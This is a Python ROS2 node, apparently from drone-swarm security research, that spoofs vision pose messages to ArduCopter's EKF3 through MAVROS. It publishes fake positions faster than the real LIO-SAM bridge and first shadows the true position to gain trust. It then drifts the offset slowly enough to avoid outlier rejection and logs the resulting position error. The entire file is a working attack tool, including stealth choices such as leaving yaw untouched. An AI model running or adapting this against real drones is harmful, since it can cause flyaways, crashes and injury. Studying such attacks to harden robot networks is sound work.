#!/usr/bin/env python3
"""
Layer 2 Attack: Vision Pose Spoofing — EKF3 Position Corruption

Publishes fake PoseStamped messages directly to MAVROS's vision_pose/pose
topic. ArduCopter's EKF3 fuses these alongside the real LIO-SAM data.
By publishing at a higher rate than the legitimate bridge, the attacker's
fake positions dominate the EKF estimate, causing drift or flyaway.

Attack strategy:
  1. Shadow phase: publish poses matching real position (builds EKF trust)
  2. Drift phase: gradually offset the published position (slow enough that
     EKF doesn't reject as outlier, fast enough to cause meaningful drift)
  3. Hold phase: maintain the offset to measure steady-state error

Attacker model: network participant that can PUBLISH to any DDS topic
(SROS2 disabled). No interception, modification, or reconfiguration of
victim systems required. The attacker only needs to know the drone's
approximate position (available from the same DDS network).

Usage:
  ros2 run swarm_mission vision_pose_spoofer --ros-args \
    -p target_drone:=drone1 \
    -p drift_x:=3.0 -p drift_y:=2.0 \
    -p shadow_duration:=10.0 \
    -p drift_duration:=20.0 \
    -p hold_duration:=20.0 \
    -p spoof_rate:=30.0

Output:
  - Console: real-time position error measurements
  - CSV: ~/vision_spoof_metrics_<drone>_<timestamp>.csv
"""
import csv
import math
import os
import time
from datetime import datetime

import rclpy
from rclpy.node import Node
from rclpy.qos import QoSProfile, ReliabilityPolicy, HistoryPolicy, DurabilityPolicy
from geometry_msgs.msg import PoseStamped
from nav_msgs.msg import Odometry
from sensor_msgs.msg import Imu


class VisionPoseSpoofer(Node):
    def __init__(self):
        super().__init__('vision_pose_spoofer')

        # ---- Parameters ----
        self.declare_parameter('target_drone', 'drone1')

        # Drift target (metres) — how far to pull the EKF estimate
        self.declare_parameter('drift_x', 3.0)
        self.declare_parameter('drift_y', 2.0)
        self.declare_parameter('drift_z', 0.0)

        # Phase durations (seconds)
        self.declare_parameter('baseline_duration', 10.0)  # measure before attack
        self.declare_parameter('shadow_duration', 10.0)     # match real pose
        self.declare_parameter('drift_duration', 20.0)      # gradually shift
        self.declare_parameter('hold_duration', 20.0)       # maintain offset
        self.declare_parameter('recovery_duration', 15.0)   # stop spoofing, measure

        # Attack tuning
        self.declare_parameter('spoof_rate', 30.0)   # Hz — higher than LIO-SAM bridge (~2-10 Hz)
        self.declare_parameter('output_dir', os.path.expanduser('~'))

        self.target_drone = self.get_parameter('target_drone').value
        self.drift_x = self.get_parameter('drift_x').value
        self.drift_y = self.get_parameter('drift_y').value
        self.drift_z = self.get_parameter('drift_z').value
        self.baseline_dur = self.get_parameter('baseline_duration').value
        self.shadow_dur = self.get_parameter('shadow_duration').value
        self.drift_dur = self.get_parameter('drift_duration').value
        self.hold_dur = self.get_parameter('hold_duration').value
        self.recovery_dur = self.get_parameter('recovery_duration').value
        self.spoof_rate = self.get_parameter('spoof_rate').value
        self.output_dir = self.get_parameter('output_dir').value

        # ---- Topics ----
        # Vision pose topic (attack target — this is what feeds EKF3)
        if self.target_drone == 'drone1':
            self.vision_pose_topic = '/mavros/vision_pose/pose'
            self.local_pos_topic = '/mavros/local_position/pose'
        else:
            self.vision_pose_topic = f'/{self.target_drone}/mavros/vision_pose/pose'
            self.local_pos_topic = f'/{self.target_drone}/mavros/local_position/pose'

        # LIO-SAM odometry (to shadow real position)
        self.odom_topic = f'/{self.target_drone}/lio_sam/mapping/odometry_incremental'

        # IMU topic (for sim-time timestamps)
        self.imu_topic = f'/{self.target_drone}/imu/data'

        # ---- State ----
        self.phase = 'baseline'
        self.phase_start_time = None
        self.real_odom_pose = None       # latest LIO-SAM odometry
        self.ekf_pose = None             # latest MAVROS local_position (EKF output)
        self.latest_imu_stamp = None     # sim-time timestamp from IMU
        self.spoof_timer = None          # timer for publishing spoofed poses
        self.current_offset_x = 0.0
        self.current_offset_y = 0.0
        self.current_offset_z = 0.0

        # Metrics
        self.metrics = []
        self.metric_interval = 1.0
        self.last_metric_time = 0.0
        self.spoof_count = 0

        # ---- QoS ----
        qos_besteffort = QoSProfile(
            reliability=ReliabilityPolicy.BEST_EFFORT,
            history=HistoryPolicy.KEEP_LAST,
            durability=DurabilityPolicy.VOLATILE,
            depth=5)

        qos_pub = QoSProfile(
            reliability=ReliabilityPolicy.RELIABLE,
            history=HistoryPolicy.KEEP_LAST,
            durability=DurabilityPolicy.VOLATILE,
            depth=10)

        # ---- Subscribers (monitoring only during baseline) ----
        self.odom_sub = self.create_subscription(
            Odometry, self.odom_topic,
            self.odom_callback, qos_besteffort)

        self.ekf_sub = self.create_subscription(
            PoseStamped, self.local_pos_topic,
            self.ekf_callback, qos_besteffort)

        self.imu_sub = self.create_subscription(
            Imu, self.imu_topic,
            self.imu_callback, qos_besteffort)

        # ---- Publisher (the attack vector) ----
        self.spoof_pub = self.create_publisher(
            PoseStamped, self.vision_pose_topic, qos_pub)

        # ---- Phase timer ----
        self.phase_timer = self.create_timer(0.5, self.phase_tick)

        # ---- CSV setup ----
        timestamp_str = datetime.now().strftime('%Y%m%d_%H%M%S')
        self.csv_path = os.path.join(
            self.output_dir,
            f'vision_spoof_metrics_{self.target_drone}_{timestamp_str}.csv')

        drift_mag = math.sqrt(self.drift_x**2 + self.drift_y**2 + self.drift_z**2)
        self.get_logger().info(
            f'=== Vision Pose Spoofing Attack ===\n'
            f'  Target: {self.target_drone}\n'
            f'  Spoof topic: {self.vision_pose_topic}\n'
            f'  Monitor odom: {self.odom_topic}\n'
            f'  Monitor EKF:  {self.local_pos_topic}\n'
            f'  Drift target: ({self.drift_x}, {self.drift_y}, {self.drift_z}) '
            f'= {drift_mag:.1f}m\n'
            f'  Spoof rate: {self.spoof_rate} Hz\n'
            f'  Phases: baseline={self.baseline_dur}s, shadow={self.shadow_dur}s, '
            f'drift={self.drift_dur}s, hold={self.hold_dur}s, '
            f'recovery={self.recovery_dur}s\n'
            f'  CSV: {self.csv_path}\n'
            f'  Starting BASELINE phase...')

        self.phase_start_time = time.monotonic()

    # ---- Callbacks ----

    def odom_callback(self, msg: Odometry):
        self.real_odom_pose = msg.pose.pose

    def ekf_callback(self, msg: PoseStamped):
        self.ekf_pose = msg.pose

    def imu_callback(self, msg: Imu):
        self.latest_imu_stamp = msg.header.stamp

    # ---- Spoof publishing ----

    def publish_spoof(self):
        """Called by timer during shadow/drift/hold phases."""
        if self.real_odom_pose is None or self.latest_imu_stamp is None:
            return

        msg = PoseStamped()
        msg.header.stamp = self.latest_imu_stamp  # sim time from IMU
        msg.header.frame_id = 'map'

        # Base position from real LIO-SAM odometry + current offset
        msg.pose.position.x = self.real_odom_pose.position.x + self.current_offset_x
        msg.pose.position.y = self.real_odom_pose.position.y + self.current_offset_y
        msg.pose.position.z = self.real_odom_pose.position.z + self.current_offset_z

        # Copy real orientation (don't mess with yaw — too obvious)
        msg.pose.orientation = self.real_odom_pose.orientation

        self.spoof_pub.publish(msg)
        self.spoof_count += 1

    # ---- Phase management ----

    def phase_tick(self):
        now = time.monotonic()
        elapsed = now - self.phase_start_time

        # Update drift offset during drift phase
        if self.phase == 'drift' and self.drift_dur > 0:
            progress = min(elapsed / self.drift_dur, 1.0)
            # Smooth ease-in-out curve (sine)
            smooth = 0.5 * (1.0 - math.cos(math.pi * progress))
            self.current_offset_x = self.drift_x * smooth
            self.current_offset_y = self.drift_y * smooth
            self.current_offset_z = self.drift_z * smooth

        # Compute position error (EKF vs real odometry)
        pos_error = self._position_error()

        # Log metrics
        if now - self.last_metric_time >= self.metric_interval:
            self.last_metric_time = now

            metric = {
                'timestamp': datetime.now().isoformat(),
                'phase': self.phase,
                'phase_elapsed_s': round(elapsed, 2),
                'offset_x': round(self.current_offset_x, 3),
                'offset_y': round(self.current_offset_y, 3),
                'offset_z': round(self.current_offset_z, 3),
                'offset_magnitude': round(math.sqrt(
                    self.current_offset_x**2 +
                    self.current_offset_y**2 +
                    self.current_offset_z**2), 3),
                'ekf_error': round(pos_error, 3) if pos_error is not None else None,
                'spoof_count': self.spoof_count,
            }

            # Add EKF and odom positions if available
            if self.ekf_pose is not None:
                metric['ekf_x'] = round(self.ekf_pose.position.x, 3)
                metric['ekf_y'] = round(self.ekf_pose.position.y, 3)
                metric['ekf_z'] = round(self.ekf_pose.position.z, 3)
            if self.real_odom_pose is not None:
                metric['odom_x'] = round(self.real_odom_pose.position.x, 3)
                metric['odom_y'] = round(self.real_odom_pose.position.y, 3)
                metric['odom_z'] = round(self.real_odom_pose.position.z, 3)

            self.metrics.append(metric)

            phase_char = {
                'baseline': '[B]',
                'shadow': '[S]',
                'drift': '[D]',
                'hold': '[H]',
                'recovery': '[R]',
            }.get(self.phase, '[?]')

            error_str = f'{pos_error:.2f}m' if pos_error is not None else 'N/A'
            offset_mag = math.sqrt(
                self.current_offset_x**2 +
                self.current_offset_y**2 +
                self.current_offset_z**2)

            self.get_logger().info(
                f'{phase_char} {elapsed:.0f}s | '
                f'offset: {offset_mag:.2f}m | '
                f'EKF error: {error_str} | '
                f'spoofed: {self.spoof_count}')

        # Phase transitions
        if self.phase == 'baseline' and elapsed >= self.baseline_dur:
            self._start_shadow()
        elif self.phase == 'shadow' and elapsed >= self.shadow_dur:
            self._start_drift()
        elif self.phase == 'drift' and elapsed >= self.drift_dur:
            self._start_hold()
        elif self.phase == 'hold' and elapsed >= self.hold_dur:
            self._start_recovery()
        elif self.phase == 'recovery' and elapsed >= self.recovery_dur:
            self._finish()

    def _position_error(self):
        """Compute 3D distance between EKF estimate and real LIO-SAM odometry."""
        if self.ekf_pose is None or self.real_odom_pose is None:
            return None
        dx = self.ekf_pose.position.x - self.real_odom_pose.position.x
        dy = self.ekf_pose.position.y - self.real_odom_pose.position.y
        dz = self.ekf_pose.position.z - self.real_odom_pose.position.z
        return math.sqrt(dx**2 + dy**2 + dz**2)

    def _start_shadow(self):
        self.phase = 'shadow'
        self.phase_start_time = time.monotonic()
        self.current_offset_x = 0.0
        self.current_offset_y = 0.0
        self.current_offset_z = 0.0

        # Start spoofing at the configured rate (matching real position)
        period = 1.0 / self.spoof_rate
        self.spoof_timer = self.create_timer(period, self.publish_spoof)

        self.get_logger().warn(
            f'=== SHADOW PHASE — Publishing real position at '
            f'{self.spoof_rate} Hz to build EKF trust ===')

    def _start_drift(self):
        self.phase = 'drift'
        self.phase_start_time = time.monotonic()

        drift_mag = math.sqrt(self.drift_x**2 + self.drift_y**2 + self.drift_z**2)
        drift_rate = drift_mag / self.drift_dur if self.drift_dur > 0 else 0

        self.get_logger().warn(
            f'=== DRIFT PHASE — Gradually shifting position by '
            f'({self.drift_x}, {self.drift_y}, {self.drift_z}) = {drift_mag:.1f}m '
            f'over {self.drift_dur}s ({drift_rate:.2f} m/s) ===')

    def _start_hold(self):
        self.phase = 'hold'
        self.phase_start_time = time.monotonic()
        # Lock offset at full drift
        self.current_offset_x = self.drift_x
        self.current_offset_y = self.drift_y
        self.current_offset_z = self.drift_z

        drift_mag = math.sqrt(self.drift_x**2 + self.drift_y**2 + self.drift_z**2)
        self.get_logger().warn(
            f'=== HOLD PHASE — Maintaining {drift_mag:.1f}m offset, '
            f'measuring steady-state EKF error ===')

    def _start_recovery(self):
        self.phase = 'recovery'
        self.phase_start_time = time.monotonic()

        # Stop spoofing
        if self.spoof_timer is not None:
            self.spoof_timer.cancel()
            self.destroy_timer(self.spoof_timer)
            self.spoof_timer = None

        self.current_offset_x = 0.0
        self.current_offset_y = 0.0
        self.current_offset_z = 0.0

        self.get_logger().warn(
            f'=== RECOVERY PHASE — Spoofing stopped, monitoring EKF recovery ===')

    def _finish(self):
        self.phase = 'done'
        self.phase_timer.cancel()

        self._write_csv()

        # Compute summary
        baseline_errors = [m['ekf_error'] for m in self.metrics
                           if m['phase'] == 'baseline' and m['ekf_error'] is not None
                           and m['phase_elapsed_s'] > 2]
        hold_errors = [m['ekf_error'] for m in self.metrics
                       if m['phase'] == 'hold' and m['ekf_error'] is not None
                       and m['phase_elapsed_s'] > 2]
        recovery_errors = [m['ekf_error'] for m in self.metrics
                           if m['phase'] == 'recovery' and m['ekf_error'] is not None
                           and m['phase_elapsed_s'] > 5]

        def avg(lst):
            return sum(lst) / len(lst) if lst else 0.0

        def maximum(lst):
            return max(lst) if lst else 0.0

        baseline_avg = avg(baseline_errors)
        hold_avg = avg(hold_errors)
        hold_max = maximum(hold_errors)
        recovery_avg = avg(recovery_errors)
        drift_mag = math.sqrt(self.drift_x**2 + self.drift_y**2 + self.drift_z**2)

        # Time to first significant drift (> 0.5m error)
        time_to_drift = None
        for m in self.metrics:
            if m['phase'] in ('drift', 'hold') and m['ekf_error'] is not None:
                if m['ekf_error'] > 0.5:
                    time_to_drift = m['phase_elapsed_s']
                    break

        drift_str = f'{time_to_drift:>5.1f}s' if time_to_drift is not None else '  N/A '

        self.get_logger().warn(
            f'\n'
            f'╔═══════════════════════════════════════════╗\n'
            f'║     VISION POSE SPOOFING ATTACK RESULTS   ║\n'
            f'╠═══════════════════════════════════════════╣\n'
            f'║ Target: {self.target_drone:<34}║\n'
            f'║ Drift target:         {drift_mag:>6.2f}m             ║\n'
            f'║ Spoof rate:           {self.spoof_rate:>6.1f} Hz           ║\n'
            f'║ Total spoofed msgs:   {self.spoof_count:>6d}              ║\n'
            f'║ Baseline EKF error:   {baseline_avg:>6.2f}m avg         ║\n'
            f'║ Hold EKF error:       {hold_avg:>6.2f}m avg         ║\n'
            f'║ Hold EKF error:       {hold_max:>6.2f}m max         ║\n'
            f'║ Recovery EKF error:   {recovery_avg:>6.2f}m avg         ║\n'
            f'║ Time to >0.5m drift:  {drift_str}              ║\n'
            f'╚═══════════════════════════════════════════╝\n'
            f'\n'
            f'CSV saved: {self.csv_path}')

    def _write_csv(self):
        if not self.metrics:
            return
        # Use all possible fields
        fieldnames = ['timestamp', 'phase', 'phase_elapsed_s',
                      'offset_x', 'offset_y', 'offset_z', 'offset_magnitude',
                      'ekf_error', 'spoof_count',
                      'ekf_x', 'ekf_y', 'ekf_z',
                      'odom_x', 'odom_y', 'odom_z']
        try:
            with open(self.csv_path, 'w', newline='') as f:
                writer = csv.DictWriter(f, fieldnames=fieldnames,
                                        extrasaction='ignore')
                writer.writeheader()
                writer.writerows(self.metrics)
            self.get_logger().info(f'Wrote {len(self.metrics)} rows to {self.csv_path}')
        except Exception as e:
            self.get_logger().error(f'Failed to write CSV: {e}')


def main(args=None):
    rclpy.init(args=args)
    node = VisionPoseSpoofer()
    try:
        rclpy.spin(node)
    except KeyboardInterrupt:
        if node.phase != 'done':
            node.get_logger().warn('Interrupted — writing partial metrics...')
            node._write_csv()
        node.get_logger().info(
            f'Shutting down — {len(node.metrics)} samples, '
            f'{node.spoof_count} spoofed messages')
    finally:
        if node.spoof_timer is not None:
            node.spoof_timer.cancel()
        node.destroy_node()
        rclpy.shutdown()


if __name__ == '__main__':
    main()
